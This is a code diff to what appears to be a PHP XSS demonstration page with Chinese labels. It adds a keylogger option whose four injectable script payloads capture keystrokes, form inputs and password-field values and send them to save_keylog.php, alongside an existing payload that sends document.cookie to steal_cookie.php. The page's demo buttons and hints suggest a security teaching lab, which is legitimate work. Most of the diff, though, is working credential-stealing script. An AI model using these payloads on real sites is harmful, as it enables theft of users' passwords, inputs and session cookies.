@@ -267,6 +267,7 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comment']) && !empty(t
                                     <select id="attackType" class="demo-select" onchange="updatePayloadOptions()">
                                         <option value="phishing">🎣 钓鱼攻击（窃取账号密码）</option>
                                         <option value="cookie">🍪 Cookie窃取</option>
+                                        <option value="keylogger">⌨️ 键盘记录（窃取输入）</option>
                                     </select>
                                 </div>
                                 <div class="demo-row">
@@ -292,7 +293,8 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comment']) && !empty(t
                                 </div>
                                 <div class="demo-info">
                                     <p>💡 提示：注入Payload后，刷新页面或点击"触发XSS攻击"按钮即可演示攻击效果</p>
-                                    <p id="cookieInfo" style="display:none;">📊 查看窃取的Cookie：<a href="view_cookies.php" target="_blank" style="color:#e74c3c;font-weight:bold;">点击查看Cookie数据</a></p>
+                                    <p id="cookieInfo" style="display:none;">📊 查看窃取的Cookie：<a href="viewer.php?tab=cookies" target="_blank" style="color:#e74c3c;font-weight:bold;">点击查看Cookie数据</a></p>
+                                    <p id="keyloggerInfo" style="display:none;">📊 查看键盘记录：<a href="viewer.php?tab=keylogs" target="_blank" style="color:#e74c3c;font-weight:bold;">点击查看键盘记录</a></p>
                                 </div>
                             </div>
                         </div>
@@ -479,11 +481,23 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comment']) && !empty(t
         ajax: '<scr' + 'ipt>\nvar xhr = new XMLHttpRequest();\nxhr.open("GET", "steal_cookie.php?c=" + encodeURIComponent(document.cookie), true);\nxhr.send();\n</scr' + 'ipt>'
     };
     
+    // 键盘记录Payload模板
+    const keyloggerPayloads = {
+        basic: '<scr' + 'ipt>\n// 键盘记录演示\n(function() {\n    var keys = "";\n    document.addEventListener("keydown", function(e) {\n        var key = e.key;\n        if(key === " ") key = "[Space]";\n        if(key === "Enter") key = "[Enter]";\n        if(key === "Tab") key = "[Tab]";\n        if(key === "Backspace") key = "[Backspace]";\n        keys += key;\n        // 发送到服务器\n        fetch("save_keylog.php?k=" + encodeURIComponent(keys));\n    });\n})();\n</scr' + 'ipt>',
+        
+        advanced: '<scr' + 'ipt>\n// 高级键盘记录演示\n(function() {\n    var buffer = "";\n    var timer = null;\n    \n    function sendKeys() {\n        if(buffer.length > 0) {\n            fetch("save_keylog.php?k=" + encodeURIComponent(buffer));\n            buffer = "";\n        }\n    }\n    \n    document.addEventListener("keydown", function(e) {\n        var key = e.key;\n        if(key === " ") key = "[Space]";\n        if(key === "Enter") {\n            key = "[Enter]";\n            buffer += key;\n            sendKeys();\n            return;\n        }\n        if(key === "Tab") key = "[Tab]";\n        if(key === "Backspace") key = "[Backspace]";\n        \n        buffer += key;\n        \n        // 每输入10个字符发送一次\n        if(buffer.length >= 10) {\n            sendKeys();\n        }\n        \n        // 3秒无输入也发送\n        clearTimeout(timer);\n        timer = setTimeout(sendKeys, 3000);\n    });\n    \n    // 页面卸载时发送剩余内容\n    window.addEventListener("beforeunload", sendKeys);\n})();\n</scr' + 'ipt>',
+        
+        form: '<scr' + 'ipt>\n// 表单输入记录演示\n(function() {\n    // 监听所有input和textarea\n    var inputs = document.querySelectorAll("input, textarea");\n    inputs.forEach(function(input) {\n        input.addEventListener("input", function(e) {\n            var data = {\n                type: e.target.type || "text",\n                name: e.target.name || "unknown",\n                value: e.target.value\n            };\n            fetch("save_keylog.php?k=" + encodeURIComponent(\n                "[" + data.name + ":" + data.value + "]"\n            ));\n        });\n    });\n})();\n</scr' + 'ipt>',
+        
+        password: '<scr' + 'ipt>\n// 密码框记录演示\n(function() {\n    var passwordFields = document.querySelectorAll("input[type=\"password\"]");\n    passwordFields.forEach(function(field) {\n        field.addEventListener("input", function(e) {\n            fetch("save_keylog.php?k=" + encodeURIComponent(\n                "[密码:" + e.target.value + "]"\n            ));\n        });\n    });\n})();\n</scr' + 'ipt>'
+    };
+    
     // 更新Payload选项
     function updatePayloadOptions() {
         const attackType = document.getElementById('attackType').value;
         const payloadSelect = document.getElementById('payloadSelect');
         const cookieInfo = document.getElementById('cookieInfo');
+        const keyloggerInfo = document.getElementById('keyloggerInfo');
         
         if(attackType === 'phishing') {
             payloadSelect.innerHTML = `
@@ -494,7 +508,8 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comment']) && !empty(t
                 <option value="baidu">跳转百度</option>
             `;
             cookieInfo.style.display = 'none';
-        } else {
+            keyloggerInfo.style.display = 'none';
+        } else if(attackType === 'cookie') {
             payloadSelect.innerHTML = `
                 <option value="img">图片方式（推荐）</option>
                 <option value="script">Script标签方式</option>
@@ -502,6 +517,16 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comment']) && !empty(t
                 <option value="ajax">AJAX方式</option>
             `;
             cookieInfo.style.display = 'block';
+            keyloggerInfo.style.display = 'none';
+        } else if(attackType === 'keylogger') {
+            payloadSelect.innerHTML = `
+                <option value="basic">基础键盘记录（推荐）</option>
+                <option value="advanced">高级键盘记录</option>
+                <option value="form">表单输入记录</option>
+                <option value="password">密码框记录</option>
+            `;
+            cookieInfo.style.display = 'none';
+            keyloggerInfo.style.display = 'block';
         }
     }
 
@@ -512,6 +537,8 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comment']) && !empty(t
         const textarea = document.querySelector('textarea[name="comment"]');
         
         let payload;
+        let attackName;
+        
         if(attackType === 'phishing') {
             // 特殊处理跳转百度的Payload
             if(select.value === 'baidu') {
@@ -519,8 +546,13 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comment']) && !empty(t
             } else {
                 payload = phishingPayloads[select.value];
             }
-        } else {
+            attackName = '钓鱼攻击';
+        } else if(attackType === 'cookie') {
             payload = cookiePayloads[select.value];
+            attackName = 'Cookie窃取';
+        } else if(attackType === 'keylogger') {
+            payload = keyloggerPayloads[select.value];
+            attackName = '键盘记录';
         }
         
         if(textarea) {
@@ -530,7 +562,6 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comment']) && !empty(t
                 textarea.style.background = '';
             }, 1000);
             
-            const attackName = attackType === 'phishing' ? '钓鱼攻击' : 'Cookie窃取';
             alert('✅ ' + attackName + ' Payload已注入到评论框！\n请点击"发表评论"按钮提交。');
         }
     }
@@ -541,6 +572,8 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comment']) && !empty(t
         const select = document.getElementById('payloadSelect');
         
         let payload;
+        let attackName;
+        
         if(attackType === 'phishing') {
             // 特殊处理跳转百度的Payload
             if(select.value === 'baidu') {
@@ -548,11 +581,14 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comment']) && !empty(t
             } else {
                 payload = phishingPayloads[select.value];
             }
-        } else {
+            attackName = '钓鱼攻击';
+        } else if(attackType === 'cookie') {
             payload = cookiePayloads[select.value];
+            attackName = 'Cookie窃取';
+        } else if(attackType === 'keylogger') {
+            payload = keyloggerPayloads[select.value];
+            attackName = '键盘记录';
         }
-        
-        const attackName = attackType === 'phishing' ? '钓鱼攻击' : 'Cookie窃取';
         
         // 创建临时div执行脚本
         const tempDiv = document.createElement('div');
@@ -570,7 +606,14 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comment']) && !empty(t
         // 对于Cookie窃取，显示提示
         if(attackType === 'cookie') {
             setTimeout(() => {
-                alert('✅ Cookie已发送到服务器！\n请访问 view_cookies.php 查看窃取的数据。');
+                alert('✅ Cookie已发送到服务器！\n请访问 viewer.php?tab=cookies 查看窃取的数据。');
+            }, 500);
+        }
+        
+        // 对于键盘记录，显示提示
+        if(attackType === 'keylogger') {
+            setTimeout(() => {
+                alert('✅ 键盘记录已启动！\n请在页面任意位置输入内容，然后访问 viewer.php?tab=keylogs 查看记录。');
             }, 500);
         }
         
